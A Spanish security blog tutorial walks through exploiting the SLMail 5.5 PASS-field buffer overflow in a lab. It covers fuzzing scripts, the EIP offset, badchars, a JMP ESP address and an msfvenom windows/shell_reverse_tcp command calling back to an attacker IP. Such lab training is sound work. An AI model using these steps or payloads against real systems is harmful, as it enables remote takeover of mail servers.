---
id: "buffer-overflow-en-slmail"
title: "Buffer Overflow 32 Bits en SLMail 5.5"
author: "juan-antonio-gonzalez-mena"
publishedDate: 2021-11-28
updatedDate: 2021-11-28
image: "https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-0.webp"
description: "Explotación manual de Buffer Overflow en SLMail 5.5, desde el fuzzing hasta conseguir una reverse shell, controlando el EIP y evitando badchars."
categories:
  - "low-level"
draft: false
featured: false
lang: "es"
---

En este post vamos a estar explotando el servicio SLMail de versión 5.5 el cual es vulnerable a un Buffer Overflow en el campo PASS:

![Vulnerabilidad en SLMail 5.5](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-1.avif)

Aunque ya haya scripts que automaticen la explotación, nosotros vamos a hacerlo de forma manual.

Antes que nada, es recomendable haber leído el post de [Fundamentos para Stack Based Buffer Overflow](https://blog.deephacking.tech/es/posts/fundamentos-para-stack-based-buffer-overflow/) si nunca has ejecutado este tipo de ataque.

Vamos a estar trabajando con nuestro Kali y un Windows 7 de 32 bits.

- [Introducción](#introducción)
- [Fuzzing](#fuzzing)
- [Tomando el control del EIP](#tomando-el-control-del-eip)
- [Averiguando badchars](#averiguando-badchars)
- [Crear payload con msfvenom](#crear-payload-con-msfvenom)
- [Buscando dirección con opcode JMP ESP](#buscando-dirección-con-opcode-jmp-esp)
- [Exploit final](#exploit-final)

## Introducción

Lo primero de todo es descargar e instalar el servicio "SLMail" en el Windows 7, previo a esto tenemos que asegurarnos que nuestro Windows 7 tiene desactivado el DEP y que el firewall no nos bloquee, al menos los puertos 25 y 110.

- El firewall podemos configurarlo usando "Windows Firewall con Seguridad Avanzada" o netsh. Este último, podemos ver como hacerlo en el post de [pivoting netsh](https://blog.deephacking.tech/es/posts/como-hacer-pivoting-con-netsh/).
- Y el DEP (Data Execution Prevention) podemos deshabilitarlo desde una terminal como administrador usando el comando:
- `bcdedit.exe /set nx AlwaysOff`

Podemos descargar SLMail 5.5 desde su [web oficial](https://slmail.software.informer.com/download/?lang=es). Una vez lo descargamos, empezamos el proceso de instalación:

![Instalación de SLMail](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-2.avif)

En este caso no hace falta tocar nada, con darle todo a "Siguiente" es suficiente. Cuando la instalación acabe reiniciaremos el equipo y listo. Tendremos el SLMail instalado.

Cuando se inicie el equipo abrimos el SLMail como administrador:

![Abrir SLMail como administrador](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-3.avif)

Y nos dirigimos a la pestaña de control:

![Pestaña de control de SLMail](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-4.avif)

Desde esta parte es donde podemos controlar si se pausa el servicio o se inicia, nos servirá para cuando se crashee al ocasionar el buffer overflow. Como vemos ahora mismo ya está iniciado, por lo que si vamos a nuestro kali, podremos ver los puertos 25 y 110 abiertos:

![Puertos 25 y 110 abiertos](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-5.avif)

Con todo el servicio instalado, ejecutándose y expuesto, ya podemos ponernos con el buffer overflow.

En este caso en particular, ya hemos identificado y ya conocemos de forma previa que el servicio es vulnerable. Además, hemos visto en searchsploit que ya hay scripts que lo explotan automáticamente. Por lo que vamos a ayudarnos de alguno de estos scripts para identificar la manera.

En cualquier otro caso, cuando no sepamos de qué servicio se trata y no sepamos casi nada, la mejor opción es simplemente conectarnos al puerto mediante netcat o telnet y ver si nos responde de alguna forma, y a partir de ahí, ver que se puede hacer.

Dicho esto, vamos a echarle un vistazo al primer script de searchsploit:

![Script de searchsploit](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-6.avif)

El título ya nos adelanta que el parámetro vulnerable parece ser `PASS`

Echando un ojo al primer script, vemos como sería el procedimiento:

![Procedimiento del exploit](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-7.avif)

El parámetro `PASS` parece ser el campo de la contraseña de un login. Además, si nos fijamos, vemos que de los dos puertos que usa SLMail, el 25 y el 110. Se conecta al 110, por lo que también identificamos a cuál de los dos puertos conectarnos.

Vamos a probarlo de forma manual:

![Prueba manual del parámetro PASS](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-8.avif)

Parece que son válidos ambos campos, aunque nos digan que las credenciales son incorrectas.

En este punto ya tenemos lo necesario para empezar:

- Servicio vulnerable detectado
- Puerto al que conectarnos
- Parámetro vulnerable

## Fuzzing

Sabiendo todo esto, es la hora de hacer Fuzzing, es decir, tenemos que averiguar que cantidad de información hace falta en el parámetro `PASS` para que se ocasione el Buffer Overflow y el programa corrompa.

Antes de hacer fuzzing, en el Windows 7 vamos a abrir como administrador el Immunity Debugger para adjuntarnos al proceso del SLMail:

![Immunity Debugger como administrador](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-9.avif)

![Adjuntar al proceso](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-10.avif)

De esta forma ya habremos adjuntado el Immunity Debugger al proceso de SLMail:

![Immunity Debugger adjuntado](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-11.avif)

Ojo, cuando nos juntamos con Immunity a un proceso, este se pausa, lo podemos ver abajo a la derecha:

![Proceso pausado](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-12.avif)

Por lo que no olvidemos nunca, reanudar el proceso:

![Reanudar proceso](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-13.avif)

![Proceso reanudado](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-14.avif)

Con esto hecho, ahora para hacer fuzzing vamos a hacer uso de un script en python, el cual nos automatiza la tarea:

```python
#!/usr/bin/python

from pwn import *
import socket, sys

if len(sys.argv) < 2:
    print "\n[!] Uso: python " + sys.argv[0] + " <ip-address>\n"
    sys.exit(0)

# Variables globales
ip_address = sys.argv[1]
rport = 9999

if __name__ == '__main__':

    buffer = ["A"]
    contador = 100

    while len(buffer) < 32:
        buffer.append("A"*contador)
        contador += 100

    p1 = log.progress("Data")

    for strings in buffer:

        try:
            p1.status("Enviando %s bytes" % len(strings))

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip_address, rport))
            data = s.recv(1024)

            s.send("%s" % strings)
            data = s.recv(1024)

        except:

            print "\n[!] Ha habido un error de conexion\n"
            sys.exit(1)
```

Éste es el script estándar, solo tenemos que adaptarlo para que se adecue al caso que necesitamos:

```python
#!/usr/bin/python

from pwn import *
import socket, sys

if len(sys.argv) < 2:
    print "\n[!] Uso: python " + sys.argv[0] + " <ip-address>\n"
    sys.exit(0)

# Variables globales
ip_address = sys.argv[1]
rport = <puerto>

if __name__ == '__main__':

    buffer = ["A"]
    contador = 150

    while len(buffer) < 32:
        buffer.append("A"*contador)
        contador += 150

    p1 = log.progress("Data")

    for strings in buffer:

        try:
            p1.status("Enviando %s bytes" % len(strings))

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip_address, rport))
            data = s.recv(1024)

            s.send("USER prueba\n\r")
            data = s.recv(1024)

            s.send("PASS %s\n\r" % strings)
            data = s.recv(1024)

        except:

            print "\n[!] Ha habido un error de conexion\n"
            sys.exit(1)
```

> Cuando mandamos el USER y el PASS, colocando `\n\r` al final. Estamos simulando que presionamos la tecla enter

El uso del script es sencillo, simplemente le tenemos que especificar una IP, además de editar el puerto en el código:

![Editar puerto en el script](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-15.avif)

![Puerto cambiado](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-16.avif)

Con el puerto cambiado, vamos a ejecutar el script apuntando al Windows 7:

![Ejecutar script de fuzzing](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-17.avif)

![Script ejecutándose](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-18.avif)

![Script detenido](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-19.avif)

Cuando se quede pillado el número de bytes, nos volvemos al immunity debugger (o también podemos ver como se comporta el immunity mientras recibe los bytes):

![Immunity Debugger con programa crasheado](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-20.avif)

![Estado del proceso pausado](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-21.avif)

![Registros sobrescritos](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-22.avif)

Como vemos el estado del programa es "Paused", por lo que el programa a crasheado. Además, podemos como se han quedado los registros.

Si nos fijamos en los campos del EBP y del EIP, vemos como el valor de los 4 bytes es `\x41` (este es el formato para representar el hexadecimal, con `\x` como prefijo).

<figure>

![Referencia sobre \x en hexadecimal](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-23.avif)

<figcaption>

[Referencia de StackOverflow sobre \x en C/C++](https://stackoverflow.com/questions/2547349/what-does-x-mean-in-c-c#:~:text=%5Cx%20indicates%20a%20hexadecimal%20character,a%20null%20%27%5Cx00%27%20)

</figcaption>

</figure>

Para quien no lo sepa, `41` es la letra A en hexadecimal. Que es exactamente lo que nosotros le estamos enviando.

![Valor 41 en hexadecimal](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-24.avif)

![Letra A en hexadecimal](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-25.avif)

¿Qué significa esto?

Básicamente, imaginémonos que el servicio como mucho esperaba en el campo "PASS", un valor máximo de 30 caracteres (que no es el caso, es bastante más).

¿Qué pasaría si nosotros le mandamos 60 caracteres?

Ocurre entonces que la memoria que tiene el programa reservado para ese campo es bastante menor que los datos recibidos, por lo que esa diferencia de 30 (60 - 30) se tiene que ir hacia algún lado. Y es aquí donde se empieza a sobrescribir registros.

La idea básicamente es esta:

![Esquema de Buffer Overflow](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-26.avif)

Teniendo esto claro, y viendo como hemos sobrescrito el EIP y el EBP, la idea ahora es tomar el control del EIP, es decir, determinar exactamente cuantas '`A`' tenemos que mandar antes de empezar a sobrescribirlo.

Este registro nos importa tanto, ya que es la dirección de la próxima instrucción del programa, por eso se llama EIP (Extended Instruction Pointer).

Por esta misma razón el programa crashea, ya que al estar sobrescribiendo este registro, cuando el programa va a seguir su flujo, lo que hace es ver a que dirección apunta el EIP, y claro, si la dirección a la que apunta es 0x41414141, pues no llega a ningún sitio, ya que no es una dirección de memoria válida. Por eso el programa se corrompe.

## Tomando el control del EIP

Con todo esto claro, para determinar el offset del EIP, o dicho de otra forma, cuantas '`A`' hacen falta hasta sobrescribirlo, vamos a hacer uso de dos herramientas de metasploit (en un examen como el OSCP es totalmente válido usar estas dos herramientas):

- `pattern_create.rb`
- `pattern_offset.rb`

Asegurándonos de que tenemos metasploit instalado, podemos encontrar estas dos herramientas de la siguiente forma:

![Localizar herramientas de Metasploit](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-27.avif)

Primero vamos a usar `pattern_create.rb`, lo que nos permite esta herramienta es crear una cadena de la longitud que nosotros indiquemos. Esta cadena está especialmente diseñada para que no haya patrones repetidos.

Antes, hemos comprobado que con 2700 bytes ya conseguíamos además de corromper el programa, sobrescribir los registros. Por lo que ahora vamos a cambiar un poco el script para directamente mandar solo un payload. El modelo del script a usar, sería el siguiente:

```python
#!/usr/bin/python

from pwn import *
import socket, sys
from struct import pack

if len(sys.argv) < 2:
    print "\n[!] Uso: python " + sys.argv[0] + " <ip-address>\n"
    sys.exit(0)

# Variables globales
ip_address = sys.argv[1]
rport = 9999

shellcode_windows=()

shellcode_linux=()

if __name__ == '__main__':

    p1 = log.progress("Data")

    payload = <payload>

    try:
        p1.status("Enviando payload")

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip_address, rport))
        data = s.recv(1024)

        s.send(payload + '\r\n')
        data = s.recv(1024)

    except:

        print "\n[!] Ha habido un error de conexion\n"
            sys.exit(1)
```

De nuevo, simplemente lo copiamos y lo adaptamos a lo que necesitemos:

```python
#!/usr/bin/python

from pwn import *
import socket, sys
from struct import pack

if len(sys.argv) < 2:
    print "\n[!] Uso: python " + sys.argv[0] + " <ip-address>\n"
    sys.exit(0)

# Variables globales
ip_address = sys.argv[1]
rport = 110

shellcode_windows=()

shellcode_linux=()

if __name__ == '__main__':

    p1 = log.progress("Data")

    payload = <payload>

    try:
        p1.status("Enviando payload")

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip_address, rport))
        data = s.recv(1024)

        s.send('USER prueba\r\n')
        data = s.recv(1024)

        s.send('PASS ' + payload + '\r\n')
        data = s.recv(1024)

    except:

        print "\n[!] Ha habido un error de conexion\n"
        sys.exit(1)
```

Con esto, vamos a generar ahora una cadena de 2700 bytes con `pattern_create.rb`:

`pattern_create.rb -l <longitud de la cadena>`

![Generar cadena con pattern_create](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-28.avif)

Copiamos este output y lo adjuntamos a la variable payload del script:

![Añadir payload al script](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-29.avif)

De esta forma, vamos a ejecutar el script para que mande directamente este payload al campo `PASS`.

> Cada vez que ocasionemos un buffer overflow y el programa corrompa, tenemos que reiniciar el servicio y volvernos a adjuntarnos con immunity debugger a él, ya que al reiniciar el servicio el proceso cambia.

Ejecutamos el exploit:

![Ejecutar exploit con pattern](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-30.avif)

En immunity podemos ver como el programa corrompe:

![Programa corrompido en Immunity](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-31.avif)

Con esto hecho, la idea ahora es fijarnos en el valor del registro EIP:

![Valor del registro EIP](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-32.avif)

Es 39694438. Este valor corresponde a una parte en concreto de la cadena que hemos enviado en el payload.

Teniendo en cuenta este número, vamos a usar `pattern_offset.rb`:

`pattern_offset.rb -q <valor del EIP>`

![Resultado de pattern_offset](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-33.avif)

Ojo, nos dice que el offset es 2606, es decir que si mandamos 2606 `A` y 4 `B`, el valor del EIP debería de ser 42424242 (ya que 42 es B en hexadecimal).

Vamos a comprobarlo:

![Script con offset correcto](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-34.avif)

Reiniciamos el servicio

Nos adjuntamos con Immunity Debugger

Ejecutamos el exploit:

![Ejecutar exploit con offset](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-35.avif)

![EIP controlado con valor 42424242](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-36.avif)

Como vemos, EIP vale las 4 `B` que hemos mandado. Es en este punto cuando se dice que tenemos el control del EIP.

## Averiguando badchars

Ahora, es hora de averiguar los "badchars". Los badchars son bytes que por así decirlo el programa no admite. De tal forma que si generásemos un payload con algún badchar, no funcionaría.

Para este paso, vamos a hacer uso de mona, un módulo de Immunity Debugger que nos facilitará la tarea.

Su instalación es bastante sencilla, descargamos el script [mona.py](https://github.com/corelan/mona) de su repositorio oficial. Este script lo movemos a la siguiente ruta:

`C:\Archivos de programa\Immunity Inc\Immunity Debugger\PyCommands`

`C:\Program Files\Immunity Inc\Immunity Debugger\PyCommands`

Y de esta forma ya se habrá instalado. Podemos comprobarlo en el Immunity Debugger con `!mona`:

![Comprobar instalación de Mona](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-37.avif)

Hecho esto, vamos a configurar el espacio de trabajo con el comando:

`!mona config -set workingfolder <ruta>\%p`

![Configurar espacio de trabajo de Mona](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-38.avif)

Ahora, vamos a generar un array de bytes de la siguiente forma:

`!mona bytearray`

![Generar bytearray con Mona](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-39.avif)

Esto nos genera una cadena con todos los bytes posibles, nos servirá para determinar cuáles son badchars y cuáles no.

Además, con este comando como hemos configurado el espacio de trabajo previamente, ahora se nos habrá generado una carpeta con el nombre del proceso al que estamos adjuntados:

![Carpeta del proceso generada](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-40.avif)

Dentro, podemos encontrar un txt con la cadena de bytes:

![Archivo de texto con bytearray](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-41.avif)

![Contenido del bytearray](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-42.avif)

Nos copiamos la cadena y la añadimos al payload.

![Añadir bytearray al payload](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-43.avif)

Con esto, hacemos lo de siempre, reiniciamos el servicio, nos adjuntamos con Immunity y ejecutamos el exploit:

![Ejecutar exploit con bytearray](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-44.avif)

![Programa crasheado con bytearray](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-45.avif)

Ahora nos interesa el valor del ESP. Mediante este valor, mona nos automatizará la tarea de detectar los badchars.

Haremos uso del siguiente comando:

`!mona compare -f <especificamos la ruta del bytearray.bin> -a <dirección del ESP>`

`!mona compare -f C:\Users\JuanA\Desktop\SLMail\bytearray.bin -a 0258A128`

![Resultado de mona compare](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-46.avif)

De esta forma, como vemos, mona nos dice que un badchars es el `\x00` (este es un badchar muy típico, por lo que normalmente se quita de inmediato)

Con esto hecho, vamos a actualizar los archivos bytearray que tenemos, para decirles que eliminen el `\x00`:

`!mona bytearray -cpb '"<badchars>"'`

`!mona bytearray -cpb '"\x00"'`

![Actualizar bytearray](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-47.avif)

De esta forma, el archivo bytearray se habrá actualizado.

![Bytearray actualizado](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-48.avif)

Como ya sabemos que `\x00` es un badchar, simplemente lo quitaremos del payload en el exploit:

![Quitar \x00 del payload](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-49.avif)

Ejecutamos el exploit...

![Ejecutar exploit sin \x00](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-50.avif)

Y ahora hacemos el mismo proceso para detectar el badchar:

`!mona compare -f <especificamos la ruta del bytearray.bin> -a <dirección del ESP>`

`!mona compare -f C:\Users\JuanA\Desktop\SLMail\bytearray.bin -a 01ADA128`

![Detectar segundo badchar](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-51.avif)

Nos detecta que el `\x0a` es otro. Pues hacemos lo mismo que antes:

`!mona bytearray -cpb '"<badchars>"'`

`!mona bytearray -cpb '"\x00\x0a"'`

![Actualizar bytearray sin \x0a](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-52.avif)

Comprobamos que se ha quitado:

![Comprobar bytearray actualizado](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-53.avif)

Y con esto, lo mismo que antes, ahora quitamos del payload el `\x0a`.

![Quitar \x0a del payload](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-54.avif)

Y repetimos de nuevo todo el proceso, esta parte es un poco repetitiva.

![Ejecutar exploit sin \x0a](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-55.avif)

![Crash del programa](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-56.avif)

`!mona compare -f <especificamos la ruta del bytearray.bin> -a <dirección del ESP>`

`!mona compare -f C:\Users\JuanA\Desktop\SLMail\bytearray.bin -a 026EA128`

![Detectar tercer badchar](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-57.avif)

Detectamos otro badchar, esta vez el `\x0d`. Pues hacemos lo mismo:

`!mona bytearray -cpb '"<badchars>"'`

`!mona bytearray -cpb '"\x00\x0a\x0d"'`

![Actualizar bytearray con tres badchars](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-58.avif)

Y pues lo mismo, quitamos ahora del exploit el `\x0d` y repetimos todo. Así, hasta que nos salga que no encuentra ninguno:

![Sin badchars adicionales](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-59.avif)

Por lo que ya hemos descubierto todos los badchars, en este caso son:

- `\x00`
- `\x0a`
- `\x0d`

## Crear payload con msfvenom

Sabiendo esto, vamos a crear el payload de la reverse shell con msfvenom (podemos usar cualquier otro payload, por ejemplo, el de ejecutar un comando concreto en Windows):

`msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<puerto> EXITFUNC=thread -a x86 --platform windows -b <badchars> -e x86/shikata_ga_nai -f c`

`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.208.10 LPORT=443 EXITFUNC=thread -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -f c`

![Generar payload con msfvenom](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-60.avif)

> Usamos el EXITFUNC=thread porque si no cuando consigamos explotar el buffer overflow y tengamos una shell. Si la perdiéramos por lo que sea y quisiéramos conseguir otra no podríamos, porque ya se habrá cargado el proceso. De esta forma podemos mandarnos cuantas shells queramos, ya que el proceso de las shells se ejecutan como thread y no sustituyen al principal del servicio

Nos copiamos el shellcode generado por msfvenom y lo añadimos al exploit:

![Shellcode generado por msfvenom](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-61.avif)

![Añadir shellcode al exploit](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-62.avif)

## Buscando dirección con opcode JMP ESP

Con esta parte hecha, solo falta un último paso. Tenemos que conseguir que el EIP apunte al ESP, es decir, a nuestro payload, ya que ahora mismo está apuntando a la dirección de 4 `B`.

Para esto, tenemos que hacer que el EIP apunte a una dirección de "JMP ESP". Una dirección la cual haga un salto automático a donde se encuentre el ESP.

Para hacer esto, vamos a usar la herramienta `nasm_shell.rb` de metasploit y `mona`.

`Nasm_shell.rb` hace lo siguiente:

![Funcionamiento de nasm_shell](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-63.avif)

De esta forma, vamos a ver el opcode asociado al JMP ESP:

<figure>

![Referencia de opcode](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-64.avif)

<figcaption>

opcode

</figcaption>

</figure>

![Obtener opcode de JMP ESP](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-65.avif)

Sabiendo que el opcode es FFE4, vamos a dirigirnos a mona y vamos a listar los módulos del proceso:

`!mona modules`

![Listar módulos con mona](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-66.avif)

Listando los módulos, tenemos que usar uno que tenga las cuatro primeras columnas de True y False, en False (ya que este BoF no tiene ninguna protección). En mi caso voy a usar el siguiente módulo:

![Seleccionar módulo adecuado](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-67.avif)

Con esto, ahora vamos a usar mona para buscar una dirección dentro de ese módulo cuyo opcode sea un JMP ESP:

`!mona find -s '"<opcode JMP ESP>"' -m <módulo>`

`!mona find -s '"\xff\xe4"' -m SLMFC.dll`

![Buscar direcciones JMP ESP](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-68.avif)

Mona nos da una serie de direcciones, podemos escoger cualquiera. El único requisito es que esa dirección no contenga ningún badchar.

En mi caso, voy a escoger por ejemplo la última, `0x5f4c4d13`.

Vamos a comprobar que efectivamente esta dirección es un jmp ESP.

Click derecho y nos copiamos la dirección:

![Copiar dirección](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-69.avif)

Nos dirigimos al siguiente botón:

![Botón para ir a dirección](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-70.avif)

Pegamos la dirección y le damos al OK. De esta forma nos llevará a la dirección que hemos especificado:

![Verificar JMP ESP](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-71.avif)

Y efectivamente, confirmamos que es un JMP ESP.

En caso de que al hacer esto nos lleve a una dirección que no tiene nada que ver con la que hemos puesto, simplemente buscamos otra vez y listo.

## Exploit final

Ya tenemos todo para explotar el buffer overflow de forma exitosa. Vamos a dirigirnos al `exploit.py` para hacer los últimos retoques:

![Exploit antes de modificar](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-72.avif)

Vamos a sustituir las 4 `B` con la dirección del JMP ESP en Little Endian:

![Sustituir B por dirección JMP ESP](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-73.avif)

En este caso usamos la librería struct para que nos haga el cambio a "Little Endian" de forma automática. También sería válido si lo hiciésemos nosotros de manera manual.

Además, para asegurarnos de que todo vaya correcto, vamos a añadirle NOPS entre el JMP ESP y el shellcode (también podriamos ocasionar un desplazamiento de la pila si no quisiéramos usar NOPS):

![Añadir NOPS al exploit](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-74.avif)

Si no sabes lo que son los NOPS, lo puedes ver en el post de [Fundamentos para Stack Based Buffer Overflow](https://blog.deephacking.tech/es/posts/fundamentos-para-stack-based-buffer-overflow/#nops).

De esta forma, ya está todo listo, si nos ponemos en escucha por el puerto que especificamos anteriormente en el msfvenom y ejecutamos el exploit:

![Shell obtenida](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-75.avif)

Conseguimos controlar el flujo del programa haciendo que se dirija a nuestro payload y que nos ejecute una shell.
